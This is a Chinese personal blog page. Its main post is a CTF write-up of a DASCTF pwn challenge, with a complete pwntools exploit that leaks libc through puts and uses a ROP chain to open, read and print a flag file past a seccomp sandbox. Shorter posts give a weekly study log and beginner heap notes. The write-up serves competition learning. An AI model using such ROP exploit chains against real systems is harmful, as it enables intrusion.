      <a class="article-title" href="/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/">
        DASCTF X GFCTF 2024｜四月开启第一局
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>周6打了一个比赛是buuctf上面上的一个比赛，叫“DASCTF X GFCTF 2024｜四月开启第一局”，只持续了一天，不算难，算一个娱乐赛吧，一共有3个pwn题都是栈的题没有堆的题目，漏洞都比较明显，不过每一道题都有有坑的地方，比较考积累。最近一直在搞堆的知识，做题有一点生疏了，以后还是要找一点时间练练题，至少不能让手有生疏。</p>
<p>写这篇文章的时候已经是第二天的晚上了，3道题才做出来1道，也是今天下午才出来的，确实有一点慢了，这周看看能不能把剩下的那两道题也做出来，把wp写了。今天先把做出来的这道题遇到的坑和wp写一写。</p>
<p><strong>第一题：pwn</strong></p>
<p>老规矩，先checksec一下程序，还好保护基本没开，可以少考虑一点，那就进ida里找漏洞。</p>
<p><img src="/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240421205639232.png" alt="image-20240421205639232"></p>
<p>在ida中的main函数如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">4</span>]; // [rsp+0h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+20h] [rbp-10h]</span><br><span class="line">  unsigned __int64 i; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  memset(buf, <span class="number">0</span>, sizeof(buf));</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, 0x100uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = 0LL; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)buf + i) == <span class="number">0xF0</span></span><br><span class="line">      || *((_BYTE *)buf + i) == <span class="number">0xE0</span></span><br><span class="line">      || *((_BYTE *)buf + i) == <span class="number">0x80</span></span><br><span class="line">      || *((_BYTE *)buf + i) == <span class="number">80</span></span><br><span class="line">      || *((_BYTE *)buf + i) == <span class="number">0xB0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;You must want to execute &quot;</span>);</span><br><span class="line">      puts(<span class="string">&quot;open read write puts openat readv writev &quot;</span>);</span><br><span class="line">      puts(<span class="string">&quot;\x1B[31;3;1myou are not allowed to execute!\x1B[0m&quot;</span>);</span><br><span class="line">      exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞以经很明显了，用read函数向buf中可以输入长度为0x100的数据但buf到rbp的距离为0x30，明显的栈溢出。再看看其他函数有没有问题，</p>
<p>在init函数中发现一个问题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void init(void)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(_bss_start, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  v0 = seccomp_init(2147418112LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 59LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 322LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 9LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 10LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 41LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 56LL, 0LL);</span><br><span class="line">  seccomp_rule_add(v0, 0LL, 101LL, 0LL);</span><br><span class="line">  seccomp_load(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显在这个程序中已经开启了沙箱保护，可以看看用沙箱禁了哪些函数</p>
<p><img src="/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240421210942757.png" alt="image-20240421210942757"></p>
<p>看看哪些函数的后面为0013，那些函数便是被禁的函数。被禁的函数还有点多，不过我们主要看有俩个函数</p>
<p><code>execve</code>和<code>mprotect</code>函数，前者代表不能直接获得shell只能使用orw的方法，第二个函数则代表在这里不能通过提升权限的方法来直接用shellcode，只能orw一个一个函数的调用了，</p>
<p>那么大致思路便基本出来了，通过栈溢出执行orw将flag打印在屏幕上，那先在看看都有哪些限制和差些什么。</p>
<p>回到main函数，在输入数据后会有一个循环将输入的数据都遍历一遍，如果检测到有与<code>0xf0,0xe0,0x80,80,0xb0</code>相同的数据便会停止程序，输出一段字。因此在输入的时候要注意避开这几个数，在我做的这里变有一个需要注意的点，可能在有的libc版本中数据不用再意这点，不过远程已经没了，我只是在自己的本地，照本地的libc版本来的，各位看官在自己的本地上打记得要更据自己的libc版本做相应的改变。</p>
<p>由于使用orw的方法需要大量的pop指令，便来看看程序自带的pop指令，</p>
<p><img src="/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240421213603601.png" alt="image-20240421213603601"></p>
<p>太少了明显不够用，那必须要用的libc中的pop指令，便要知道这个程序中的libc_base（libc的基地址）是多少，将程序中的函数的got地址暴露出来，刚好在程序中有puts函数，那便用puts函数将程序中的puts函数的got地址暴露出来，然后由于在程序中没有再次输入的地方，便要再次回到main函数再次执行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">main=<span class="number">0x401386</span>//返回地址，为了继续执行</span><br><span class="line">puts_plt=<span class="number">0x4010D4</span></span><br><span class="line">puts_got=<span class="number">0x404028</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401381</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x401482&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload=flat(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>,p64(pop_rdi_ret),p64(puts_got),p64(puts_plt),p64(main))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_libc=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_libc:&#x27;</span>,<span class="built_in">hex</span>(puts_libc))</span><br></pre></td></tr></table></figure>



<p>在执行完这段命令后便可以知道puts_got的地址，然后根据自身的libc版本中的puts函数的偏移地址，便可以知道libc_base的地址，在根据libc中的其他函数和pop指令的偏移地址，便可以知道所需的函数与pop指令的地址，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#elo=ELF(&#x27;libc6_2.35-0ubuntu3.4_amd64.so&#x27;)</span></span><br><span class="line">elo=ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts=elo.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts))</span><br><span class="line">base_libc=puts_libc-puts</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_libc:&#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line"></span><br><span class="line">open_libc=elo.symbols[<span class="string">&#x27;open&#x27;</span>] </span><br><span class="line">read_libc=elo.symbols[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>=open_libc+base_libc-<span class="number">1</span></span><br><span class="line">//这里也是一个坑，在我的版本中如果直接使用<span class="built_in">open</span>的地址会有与之前那个相同的数字，程序不能被执行，这里我试过</span><br><span class="line">//+<span class="number">1</span>发现没用，+<span class="number">1</span>后程序会直接不执行<span class="built_in">open</span>，但-<span class="number">1</span>虽然一开始不直接执行但在之后还是会执行完整个<span class="built_in">open</span>函数</span><br><span class="line">read0=read_libc+base_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open:&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">open</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read0:&#x27;</span>,<span class="built_in">hex</span>(read0))</span><br><span class="line"></span><br><span class="line">buf_flag=<span class="number">0x404090</span>//bss段中的空地址，在之后用来存放<span class="string">&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">read_plt=<span class="number">0x401100</span></span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x404100</span>//bss段中的空地址，在之后用来存放读取到的flag</span><br><span class="line">pop_rbp_ret=<span class="number">0x4011ed</span></span><br><span class="line">pop_rsi_ret_libc=<span class="number">0x2be51</span></span><br><span class="line">pop_rsi_ret=pop_rsi_ret_libc+base_libc</span><br><span class="line"></span><br><span class="line">pop_rbp_r12_ret_libc=<span class="number">0x35730</span>//一开始忘了程序中有rbp的命令，在后面就没用了</span><br><span class="line">pop_rbp_r12_ret=pop_rbp_r12_ret_libc+base_libc</span><br><span class="line"></span><br><span class="line">pop_rdx_r12_ret_libc=<span class="number">0x904a9</span></span><br><span class="line">//一开始想只用rdx的，发现在我的这里用rdx的会触发之前的那个检测干脆换一个，将r12命令为<span class="number">0</span>就行</span><br><span class="line">pop_rdx_r12_ret=pop_rdx_r12_ret_libc+base_libc</span><br></pre></td></tr></table></figure>



<p>那现在已知的便是orw所必须open函数，read函数，puts函数的地址，已及需要调用的寄存器的值，那么现在还差的便是<code>./flag</code>的地址，用于在open函数将flag打开。在程序中寻找，并没有找到有着段字符串，那么就要我们自己将<code>./flag</code>通过调用read函数的方法注入到一个空的bss段地址中。如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload=flat(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>,p64(pop_rsi_ret),p64(buf_flag))</span><br><span class="line">payload+=flat(p64(pop_rbp_ret),p64(<span class="number">1</span>),p64(pop_rdx_r12_ret),p64(<span class="number">8</span>),p64(<span class="number">0</span>))</span><br><span class="line">payload+=flat(p64(read_plt),p64(main))</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=flat(b&#x27;A&#x27;*0x38,p64(pop_rdi_ret),p64(buf_flag),p64(read0))</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)//将存放地址的数据充填满<span class="number">8</span>个字节，使用\x00\x00</span><br></pre></td></tr></table></figure>



<p><strong>在这里有一个必须要注意的一点，我之前在直接输用数据栈溢出时，输入的数据并没有到达程序输入的最大值0x100，而是到我需要的就停止了。这里理论上并没有什么问题，但是在实操时会发现，程序会将后面才输入数据一同在这里录进去，直到满足0x100的长度。这样对我们后面的操作是绝对不行的，我上网查了一下，解决的方法有两种，一种是加上一个间断的时间函数使程序在输入该输入的数据就停下了，不将后面的数据录进去（很明显我不会），第二种，便是我使用的方法，直接注入程序能注入的最大值，将出了有效的数据其他都充填为垃圾数据。然后在输入后面的数据便不会出现程序在这里就将后面的数据一同录进去的事</strong></p>
<p>到达这里那基本条件已经算完成了，可以开始orw的使用了，有关其基本操作这里不在细讲我之前的文章中有，可以去看看<a href="https://2023478.github.io/2024/03/27/%E5%8D%9A%E5%AE%A2/">Wgiegie-pwn基操 | 纲的blog (2023478.github.io)</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload=flat(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>,p64(pop_rdi_ret),p64(buf_flag),p64(pop_rsi_ret),p64(<span class="number">0</span>))</span><br><span class="line">payload+=flat(p64(pop_rbp_ret),p64(<span class="number">1</span>),p64(<span class="built_in">open</span>))</span><br><span class="line"></span><br><span class="line">payload+=flat(p64(pop_rdi_ret),p64(<span class="number">3</span>),p64(pop_rsi_ret),p64(buf))</span><br><span class="line">payload+=flat(p64(pop_rdx_r12_ret),p64(<span class="number">0x30</span>),p64(<span class="number">0</span>))</span><br><span class="line">payload+=flat(p64(pop_rbp_ret),p64(<span class="number">1</span>),p64(read_plt))</span><br><span class="line"></span><br><span class="line">payload+=flat(p64(pop_rdi_ret),p64(buf),p64(puts_plt))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/image-20240422200011820.png" alt="image-20240422200011820"></p>
<p>当然这个flag是我本地自己整的，比赛经没了，所以这里的我只能打本地。我总感觉如果打远程肯定还是会遇到问题，不过远程已经没了，就只能这样吧，以后遇到再说。</p>
<p>在这里我打时也遇到过一些问题，就比如之前关于open函数地址的语句中因为我直接使用这个函数地址时，又会被这前那个检测的数据，故我将其-1处理，这样也能执行到open函数，我之前还试过+1，这个不知道为什么不能用，希望有大佬能为我解答。</p>
<p>总exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.buuoj.cn&quot;,27743)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main=<span class="number">0x401386</span></span><br><span class="line">puts_plt=<span class="number">0x4010D4</span></span><br><span class="line">puts_got=<span class="number">0x404028</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401381</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x401482&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload=flat(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>,p64(pop_rdi_ret),p64(puts_got),p64(puts_plt),p64(main))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_libc=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_libc:&#x27;</span>,<span class="built_in">hex</span>(puts_libc))</span><br><span class="line"></span><br><span class="line"><span class="comment">#elo=ELF(&#x27;libc6_2.35-0ubuntu3.4_amd64.so&#x27;)</span></span><br><span class="line">elo=ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts=elo.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts))</span><br><span class="line">base_libc=puts_libc-puts</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_libc:&#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line"></span><br><span class="line">open_libc=elo.symbols[<span class="string">&#x27;open&#x27;</span>] </span><br><span class="line">read_libc=elo.symbols[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>=open_libc+base_libc-<span class="number">1</span></span><br><span class="line">read0=read_libc+base_libc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open:&#x27;</span>,<span class="built_in">hex</span>(<span class="built_in">open</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read0:&#x27;</span>,<span class="built_in">hex</span>(read0))</span><br><span class="line"></span><br><span class="line">buf_flag=<span class="number">0x404090</span></span><br><span class="line">read_plt=<span class="number">0x401100</span></span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x404100</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x4011ed</span></span><br><span class="line">pop_rsi_ret_libc=<span class="number">0x2be51</span></span><br><span class="line">pop_rsi_ret=pop_rsi_ret_libc+base_libc</span><br><span class="line"></span><br><span class="line">pop_rbp_r12_ret_libc=<span class="number">0x35730</span></span><br><span class="line">pop_rbp_r12_ret=pop_rbp_r12_ret_libc+base_libc</span><br><span class="line"></span><br><span class="line">pop_rdx_r12_ret_libc=<span class="number">0x904a9</span></span><br><span class="line">pop_rdx_r12_ret=pop_rdx_r12_ret_libc+base_libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>,p64(pop_rsi_ret),p64(buf_flag))</span><br><span class="line">payload+=flat(p64(pop_rbp_ret),p64(<span class="number">1</span>),p64(pop_rdx_r12_ret),p64(<span class="number">8</span>),p64(<span class="number">0</span>))</span><br><span class="line">payload+=flat(p64(read_plt),p64(main))</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=flat(b&#x27;A&#x27;*0x38,p64(pop_rdi_ret),p64(buf_flag),p64(read0))</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=flat(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span>,p64(pop_rdi_ret),p64(buf_flag),p64(pop_rsi_ret),p64(<span class="number">0</span>))</span><br><span class="line">payload+=flat(p64(pop_rbp_ret),p64(<span class="number">1</span>),p64(<span class="built_in">open</span>))</span><br><span class="line"></span><br><span class="line">payload+=flat(p64(pop_rdi_ret),p64(<span class="number">3</span>),p64(pop_rsi_ret),p64(buf))</span><br><span class="line">payload+=flat(p64(pop_rdx_r12_ret),p64(<span class="number">0x30</span>),p64(<span class="number">0</span>))</span><br><span class="line">payload+=flat(p64(pop_rbp_ret),p64(<span class="number">1</span>),p64(read_plt))</span><br><span class="line"></span><br><span class="line">payload+=flat(p64(pop_rdi_ret),p64(buf),p64(puts_plt))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<p>逆天官方，在qq群里说不发官方wp，还以为真的不发，结果又发出来了，放个链接吧</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/nfeexx903ltettux">https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/nfeexx903ltettux</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn%E9%A2%98%E8%A7%A3/" rel="tag">pwn题解</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/CTF/">CTF</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-周报（2024-4-8-2024-4-14）" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/04/14/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-8-2024-4-14%EF%BC%89/" class="article-date">
  	<time datetime="2024-04-14T13:25:07.000Z" itemprop="datePublished">2024-04-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/04/14/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-8-2024-4-14%EF%BC%89/">
        周报（2024.4.8-2024.4.14）
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>好快，有到写周报的时间了，这周做的事还算有，不至于像上个星期一样都找不到什么写的。那废话不多来看看这周都做了什么事。</p>
<p><strong>堆</strong></p>
<p>万事开头难，这个堆的头也算是终于开了，不过学到的东西依然不算多，只是少少的一部分，看视频的进度还是有一点慢了，并且看的不算仔细，这之后要多看几遍，尽量多理解。堆的笔记依然在更新，以后看的知识点便记上去。</p>
<p>堆这里学了一点chunk的结构，好像其他得就不是很明白了，下周仔细看看。</p>
<p>好像除了学了一点堆的知识其他的好像就没怎么学了，之前说要复现的题一直没搞懂，找了网上的wp也没看懂，难整。</p>
<p>这个周末打了一场比赛，又是坐牢赛，连pwn题都没有，全是misc和web。</p>
<p>周6的时候之前一直用的小蓝猫突然不行了，又花了点时间处理这个问题虽然到目前也没有结果，甚至我充进去的30感觉要打水漂了，现在从新整了一个，虽然能用可是好贵啊，</p>
<p>这两个就是我之前整的，第一个是没问题的，第二个便是我怀疑跑路的网站</p>
<p><a target="_blank" rel="noopener" href="https://u.kkkcloud.men/#/plan">BH专线版 (kkkcloud.men)</a></p>
<p><a target="_blank" rel="noopener" href="https://v2.suda.moe/user">用户中心 — SudaCloud</a></p>
<p>行吧，到这里以差不多该结束了，下周继续学习，多学一点有关堆的知识吧。</p>
<p><img src="/2024/04/14/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-8-2024-4-14%EF%BC%89/image-20240414215245873.png" alt="image-20240414215245873"></p>
<p><img src="/2024/04/14/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-8-2024-4-14%EF%BC%89/image-20240414215254133.png" alt="image-20240414215254133"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%A8%E6%8A%A5/" rel="tag">周报</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/%E5%91%A8%E6%8A%A5/">周报</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-堆（随便写一写，当笔记用）" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/" class="article-date">
  	<time datetime="2024-04-09T12:53:47.000Z" itemprop="datePublished">2024-04-09</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/04/09/%E5%A0%86%EF%BC%88%E9%9A%8F%E4%BE%BF%E5%86%99%E4%B8%80%E5%86%99%EF%BC%8C%E5%BD%93%E7%AC%94%E8%AE%B0%E7%94%A8%EF%BC%89/">
        堆（随便写一写，当笔记用）
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>开始学习堆的知识，便整这个博客当笔记用用，将平时视频里看到的东西记录一下。</p>
<p><strong>arena</strong></p>
<p>内存分配区，可以理解为堆管理器所持有的内存池</p>
<p>操作系统 –&gt; 堆管理器 –&gt; 用户</p>
<p>物理内存 –&gt; arena –&gt; 可用内存</p>
<p>堆管理器与用户的内存交易发生于arena中，可以理解为堆管理器向操作系统批发来的有冗余的内存库存</p>
<p>相当于使用操作系统有的是物理内存，堆管理器只在操作系统与用户之间，用来使用户利用堆的一个东西，</p>
<p>在用户使用堆管理器开始利用堆时，堆管理器便会将物理内存中的可用片段放入arena中，在收到堆管理器的所需大小，便将其中的物理内存转换为可用内存供用户使用。arena中的内存的大小是大于用户所需要的内存的。</p>
<p>如果在C语言中使用malloc这个函数如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>

<p>当执行完这行代码后堆管理器便会在arena中找到一块大小为0x100的区域作为分配给用户的堆的区域</p>
<p>同时我们所获得这个ptr是个指针，指向是通过malloc（）后得到的一块内存区域chunk的中间。</p>
<p><strong>每次 malloc 申请得到的内存指针，其实指向 user data 的起始处</strong></p>
<p><strong>chunk</strong></p>
<p>用户申请内存的单位，也是堆管理器管理内存的基本单位 </p>
<p>malloc()返回的指针指向一个chunk的数据区域</p>
